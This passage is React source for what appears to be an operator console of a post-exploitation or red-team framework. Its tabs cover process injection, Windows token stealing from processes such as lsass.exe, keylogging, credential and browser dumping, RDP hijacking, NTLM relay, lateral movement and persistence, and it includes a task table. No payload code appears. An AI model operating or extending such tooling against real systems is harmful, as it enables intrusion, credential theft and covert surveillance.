                      </div>
                    </div>
                    <p className="text-xs text-ctp-overlay0 text-center">
                      Use the Process tab to browse and select a target process
                    </p>
                  </div>
                </div>

                {/* OPSEC gate modal for injection */}
                {injectGate.open && injectGate.technique && (
                  <OpsecGate
                    isOpen={injectGate.open}
                    onClose={closeInjectGate}
                    onConfirm={confirmInjectGate}
                    taskType={`inject / ${injectGate.technique}`}
                    assessment={assessInjectionTechnique(injectGate.technique)}
                  />
                )}
              </div>
            )}

            {activeTab === 'token' && (
              <div className="flex-1 overflow-auto p-4">
                <div className="max-w-2xl mx-auto">
                  <h2 className="text-lg font-semibold text-ctp-text mb-4">Token Manipulation</h2>
                  <p className="text-ctp-subtext0 mb-6">
                    Manage Windows access tokens for privilege escalation and impersonation.
                  </p>

                  {/* Error/Success Messages */}
                  {tokenError && (
                    <div className="mb-4 p-3 bg-ctp-red/10 border border-ctp-red/30 rounded-lg">
                      <p className="text-sm text-ctp-red">{tokenError}</p>
                    </div>
                  )}
                  {tokenSuccess && (
                    <div className="mb-4 p-3 bg-ctp-green/10 border border-ctp-green/30 rounded-lg">
                      <p className="text-sm text-ctp-green">{tokenSuccess}</p>
                    </div>
                  )}

                  <div className="space-y-4">
                    <div className="p-4 bg-ctp-surface0 rounded-lg border border-ctp-surface1">
                      <h3 className="text-sm font-medium text-ctp-text mb-3">Token Operations</h3>
                      <div className="space-y-2">
                        <button
                          onClick={handleListTokens}
                          disabled={tokenLoading}
                          className="w-full p-3 text-left rounded bg-ctp-surface1 hover:bg-ctp-surface2 transition-colors flex items-center gap-3 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          <svg className="w-5 h-5 text-ctp-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 10h16M4 14h16M4 18h16" />
                          </svg>
                          <div className="flex-1">
                            <span className="text-ctp-text font-medium">List Tokens</span>
                            <span className="block text-xs text-ctp-subtext0">Enumerate available tokens on the system</span>
                          </div>
                          <RiskBadge level={assessTaskRisk('ps').riskLevel} />
                        </button>

                        <button
                          onClick={() => setShowStealDialog(true)}
                          disabled={tokenLoading}
                          className="w-full p-3 text-left rounded bg-ctp-surface1 hover:bg-ctp-surface2 transition-colors flex items-center gap-3 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          <svg className="w-5 h-5 text-ctp-peach" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4" />
                          </svg>
                          <div className="flex-1">
                            <span className="text-ctp-text font-medium">Steal Token</span>
                            <span className="block text-xs text-ctp-subtext0">Duplicate token from target process</span>
                          </div>
                          <RiskBadge level="high" />
                        </button>

                        <button
                          onClick={() => setShowMakeDialog(true)}
                          disabled={tokenLoading}
                          className="w-full p-3 text-left rounded bg-ctp-surface1 hover:bg-ctp-surface2 transition-colors flex items-center gap-3 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          <svg className="w-5 h-5 text-ctp-mauve" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A13.916 13.916 0 008 11a4 4 0 118 0c0 1.017-.07 2.019-.203 3m-2.118 6.844A21.88 21.88 0 0015.171 17m3.839 1.132c.645-2.266.99-4.659.99-7.132A8 8 0 008 4.07M3 15.364c.64-1.319 1-2.8 1-4.364 0-1.457.39-2.823 1.07-4" />
                          </svg>
                          <div className="flex-1">
                            <span className="text-ctp-text font-medium">Make Token</span>
                            <span className="block text-xs text-ctp-subtext0">Create token from credentials</span>
                          </div>
                          <RiskBadge level="medium" />
                        </button>

                        <button
                          onClick={handleRevertToSelf}
                          disabled={tokenLoading}
                          className="w-full p-3 text-left rounded bg-ctp-surface1 hover:bg-ctp-surface2 transition-colors flex items-center gap-3 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          <svg className="w-5 h-5 text-ctp-red" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" />
                          </svg>
                          <div className="flex-1">
                            <span className="text-ctp-text font-medium">Revert to Self</span>
                            <span className="block text-xs text-ctp-subtext0">Drop impersonation, return to original token</span>
                          </div>
                          <RiskBadge level="low" />
                        </button>
                      </div>
                    </div>

                    <div className="p-3 bg-ctp-yellow/10 border border-ctp-yellow/30 rounded-lg">
                      <p className="text-xs text-ctp-yellow">
                        Token operations require appropriate privileges. Some operations may trigger security alerts.
                      </p>
                    </div>
                  </div>
                </div>

                {/* Steal Token Dialog */}
                {showStealDialog && (
                  <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
                    <div className="bg-ctp-base border border-ctp-surface1 rounded-lg p-6 max-w-md w-full mx-4">
                      <h3 className="text-lg font-semibold text-ctp-text mb-4">Steal Token</h3>
                      <div className="space-y-4">
                        <div>
                          <label className="block text-sm text-ctp-subtext0 mb-2">Target Process ID</label>
                          <input
                            type="number"
                            value={stealPid}
                            onChange={(e) => setStealPid(e.target.value)}
                            placeholder="Enter PID (e.g., 1234)"
                            className="w-full px-3 py-2 bg-ctp-surface0 border border-ctp-surface1 rounded text-ctp-text focus:outline-none focus:border-ctp-mauve"
                          />
                          <p className="text-xs text-ctp-subtext0 mt-1">
                            Use the Process tab to find high-privilege processes (e.g., lsass.exe, winlogon.exe)
                          </p>
                        </div>
                        <div className="flex gap-2">
                          <button
                            onClick={handleStealToken}
                            disabled={tokenLoading}
                            className="flex-1 px-4 py-2 bg-ctp-peach text-ctp-base rounded hover:bg-ctp-peach/90 disabled:opacity-50"
                          >
                            Steal
                          </button>
                          <button
                            onClick={() => {
                              setShowStealDialog(false);
                              setStealPid('');
                            }}
                            className="flex-1 px-4 py-2 bg-ctp-surface1 text-ctp-text rounded hover:bg-ctp-surface2"
                          >
                            Cancel
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {/* Make Token Dialog */}
                {showMakeDialog && (
                  <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
                    <div className="bg-ctp-base border border-ctp-surface1 rounded-lg p-6 max-w-md w-full mx-4">
                      <h3 className="text-lg font-semibold text-ctp-text mb-4">Make Token</h3>
                      <div className="space-y-4">
                        <div>
                          <label className="block text-sm text-ctp-subtext0 mb-2">Domain</label>
                          <input
                            type="text"
                            value={makeDomain}
                            onChange={(e) => setMakeDomain(e.target.value)}
                            placeholder="Domain (default: .)"
                            className="w-full px-3 py-2 bg-ctp-surface0 border border-ctp-surface1 rounded text-ctp-text focus:outline-none focus:border-ctp-mauve"
                          />
                        </div>
                        <div>
                          <label className="block text-sm text-ctp-subtext0 mb-2">Username</label>
                          <input
                            type="text"
                            value={makeUsername}
                            onChange={(e) => setMakeUsername(e.target.value)}
                            placeholder="Username"
                            className="w-full px-3 py-2 bg-ctp-surface0 border border-ctp-surface1 rounded text-ctp-text focus:outline-none focus:border-ctp-mauve"
                          />
                        </div>
                        <div>
                          <label className="block text-sm text-ctp-subtext0 mb-2">Password</label>
                          <input
                            type="password"
                            value={makePassword}
                            onChange={(e) => setMakePassword(e.target.value)}
                            placeholder="Password"
                            className="w-full px-3 py-2 bg-ctp-surface0 border border-ctp-surface1 rounded text-ctp-text focus:outline-none focus:border-ctp-mauve"
                          />
                        </div>
                        <div className="flex gap-2">
                          <button
                            onClick={handleMakeToken}
                            disabled={tokenLoading}
                            className="flex-1 px-4 py-2 bg-ctp-mauve text-ctp-base rounded hover:bg-ctp-mauve/90 disabled:opacity-50"
                          >
                            Create
                          </button>
                          <button
                            onClick={() => {
                              setShowMakeDialog(false);
                              setMakeUsername('');
                              setMakePassword('');
                              setMakeDomain('.');
                            }}
                            className="flex-1 px-4 py-2 bg-ctp-surface1 text-ctp-text rounded hover:bg-ctp-surface2"
                          >
                            Cancel
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            )}
            {activeTab === 'keylog' && (
              <div className="flex-1 overflow-auto p-4">
                <KeylogPanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'clipboard' && (
              <div className="flex-1 overflow-auto p-4">
                <ClipboardPanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'env' && (
              <div className="flex-1 overflow-auto p-4">
                <EnvironmentPanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'registry' && (
              <div className="flex-1 overflow-auto p-4">
                <RegistryBrowser sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'services' && (
              <div className="flex-1 overflow-auto p-4">
                <ServiceManager sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'persist' && (
              <div className="flex-1 overflow-auto p-4">
                <PersistencePanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'scan' && (
              <div className="flex-1 overflow-auto p-4">
                <ScanPanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'lateral' && (
              <div className="flex-1 overflow-auto p-4">
                <LateralPanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'ad' && (
              <div className="flex-1 overflow-auto p-4">
                <ADPanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'creds' && (
              <div className="flex-1 overflow-auto p-4">
                <CredentialPanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'browser' && (
              <div className="flex-1 overflow-auto p-4">
                <BrowserDumpPanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'media' && (
              <div className="flex-1 overflow-auto p-4">
                <MediaCapturePanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'usb' && (
              <div className="flex-1 overflow-auto p-4">
                <USBMonitorPanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'rdp' && (
              <div className="flex-1 overflow-auto p-4">
                <RDPHijackPanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'ntlm' && (
              <div className="flex-1 overflow-auto p-4">
                <NTLMRelayPanel sessionId={sessionId!} />
              </div>
            )}
            {activeTab === 'portfwd' && (
              <div className="flex-1 overflow-auto p-4">
                <PortForwardPanel sessionId={sessionId!} />
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

function TabButton({
  active,
  onClick,
  children,
}: {
  active: boolean;
  onClick: () => void;
  children: React.ReactNode;
}) {
  return (
    <button
      onClick={onClick}
      className={`px-4 py-2 text-sm font-medium transition-colors ${
        active
          ? 'text-ctp-mauve border-b-2 border-ctp-mauve bg-ctp-mantle'
          : 'text-ctp-subtext0 hover:text-ctp-text hover:bg-ctp-surface0/30'
      }`}
    >
      {children}
    </button>
  );
}

function getStatusName(status: number): string {
  const names: Record<number, string> = {
    0: 'unknown',
    1: 'queued',
    2: 'dispatched',
    3: 'completed',
    4: 'failed',
    5: 'cancelled',
    6: 'expired',
  };
  return names[status] ?? 'unknown';
}

function TasksTable({ tasks, sessionId }: { tasks: TaskInfo[]; sessionId: string }) {
  const queryClient = useQueryClient();
  const [cancellingIds, setCancellingIds] = useState<Set<string>>(new Set());
  const [cancelError, setCancelError] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState<string>('all');

  const filteredTasks = tasks.filter(task => {
    const taskId = uuidToHex(task.taskId);
    const matchesSearch = searchQuery === '' ||
      task.taskType.toLowerCase().includes(searchQuery.toLowerCase()) ||
      taskId.toLowerCase().includes(searchQuery.toLowerCase());
    const taskStatus = getStatusName(task.status);
    const matchesStatus = statusFilter === 'all' || taskStatus === statusFilter;
    return matchesSearch && matchesStatus;
  });

  const handleCancel = async (task: TaskInfo) => {
    const taskHex = uuidToHex(task.taskId);
    setCancellingIds(prev => new Set(prev).add(taskHex));
    setCancelError(null);
    try {
      await taskClient.cancelTask({ taskId: task.taskId });
      queryClient.invalidateQueries({ queryKey: ['tasks', sessionId] });
    } catch (err) {
      setCancelError(err instanceof Error ? err.message : 'Failed to cancel task');
    } finally {
      setCancellingIds(prev => {
        const next = new Set(prev);
        next.delete(taskHex);
        return next;
      });
    }
  };

  if (tasks.length === 0) {
    return (
      <div className="text-center text-ctp-subtext0 py-8">
        No tasks yet. Run a command in the terminal.
      </div>
    );
  }

  return (
    <div>
      {cancelError && (
        <div className="mb-3 px-3 py-2 bg-ctp-red/10 border border-ctp-red/30 rounded text-ctp-red text-xs">
          {cancelError}
        </div>
      )}
      <div className="flex items-center gap-3 mb-4">
        <input
          type="text"
          placeholder="Search by type or ID..."
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          className="flex-1 max-w-xs px-3 py-1.5 text-sm bg-ctp-surface0 border border-ctp-surface1 rounded-lg focus:outline-none focus:border-ctp-mauve"
        />
        <select
          value={statusFilter}
          onChange={(e) => setStatusFilter(e.target.value)}
          className="px-3 py-1.5 text-sm bg-ctp-surface0 border border-ctp-surface1 rounded-lg focus:outline-none focus:border-ctp-mauve"
        >
          <option value="all">All Status</option>
          <option value="queued">Queued</option>
          <option value="dispatched">Dispatched</option>
          <option value="completed">Completed</option>
          <option value="failed">Failed</option>
          <option value="cancelled">Cancelled</option>
          <option value="expired">Expired</option>
        </select>
        <span className="text-xs text-ctp-subtext0">
          {filteredTasks.length} of {tasks.length} tasks
        </span>
      </div>
      <table className="w-full text-sm">
        <thead>
          <tr className="text-ctp-subtext0 text-left border-b border-ctp-surface0">
            <th className="pb-2 pr-4">Time</th>
            <th className="pb-2 pr-4">Task ID</th>
            <th className="pb-2 pr-4">Type</th>
            <th className="pb-2 pr-4">Status</th>
            <th className="pb-2"></th>
          </tr>
        </thead>
        <tbody className="divide-y divide-ctp-surface0">
          {filteredTasks.map((task) => {
            const taskHex = uuidToHex(task.taskId);
            const taskId = taskHex.slice(0, 8);
            const time = task.issuedAt
              ? new Date(Number(task.issuedAt.millis)).toLocaleTimeString()
              : '—';
            const cancellable = task.status === 1 || task.status === 2;
            const isCancelling = cancellingIds.has(taskHex);
            return (
              <tr key={taskId} className="hover:bg-ctp-surface0/30">
                <td className="py-2 pr-4 text-ctp-subtext0">{time}</td>
                <td className="py-2 pr-4 font-mono text-ctp-subtext1">{taskId}</td>
                <td className="py-2 pr-4">{task.taskType}</td>
                <td className="py-2 pr-4">
                  <TaskStatusBadge status={task.status} />
                </td>
                <td className="py-2 text-right">
                  {cancellable && (
                    <button
                      onClick={() => handleCancel(task)}
                      disabled={isCancelling}
                      className="px-2 py-0.5 text-xs text-ctp-red hover:text-ctp-base hover:bg-ctp-red rounded transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      {isCancelling ? 'Cancelling…' : 'Cancel'}
                    </button>
                  )}
                </td>
              </tr>
            );
          })}
        </tbody>
      </table>
    </div>
  );
}

function TaskStatusBadge({ status }: { status: number }) {
  const labels: Record<number, { text: string; cls: string }> = {
    0: { text: 'unknown', cls: 'text-ctp-subtext0' },
    1: { text: 'queued', cls: 'text-ctp-yellow' },
    2: { text: 'dispatched', cls: 'text-ctp-blue' },
    3: { text: 'completed', cls: 'text-ctp-green' },
    4: { text: 'failed', cls: 'text-ctp-red' },
    5: { text: 'cancelled', cls: 'text-ctp-subtext0' },
    6: { text: 'expired', cls: 'text-ctp-subtext0' },
  };
  const { text, cls } = labels[status] ?? labels[0];
  return <span className={`text-xs font-medium ${cls}`}>{text}</span>;
}

function ExportButton({ tasks, sessionId }: { tasks: TaskInfo[]; sessionId: string }) {
  const handleExport = () => {
    const lines: string[] = [
      `# Session Transcript: ${sessionId}`,
      `# Exported: ${new Date().toISOString()}`,
      `# Tasks: ${tasks.length}`,
      '',
    ];

    for (const task of tasks) {
      const time = task.issuedAt
        ? new Date(Number(task.issuedAt.millis)).toISOString()
        : 'unknown';
      lines.push(`[${time}] ${task.taskType}`);

      if (task.resultData && task.resultData.length > 0) {
        try {
          const result = ShellResult.fromBinary(task.resultData);
          if (result.stdout) lines.push(result.stdout);
          if (result.stderr) lines.push(`[stderr] ${result.stderr}`);
          lines.push(`[exit: ${result.exitCode}, duration: ${result.durationMs}ms]`);
        } catch {
          lines.push('[binary output]');
        }
      }
      lines.push('');
    }

    const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `session-${sessionId.slice(0, 8)}-${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <button
      onClick={handleExport}
      disabled={tasks.length === 0}
      className="px-3 py-1 mr-2 text-xs text-ctp-subtext0 hover:text-ctp-text disabled:opacity-50 transition-colors"
    >
      Export
    </button>
  );
}
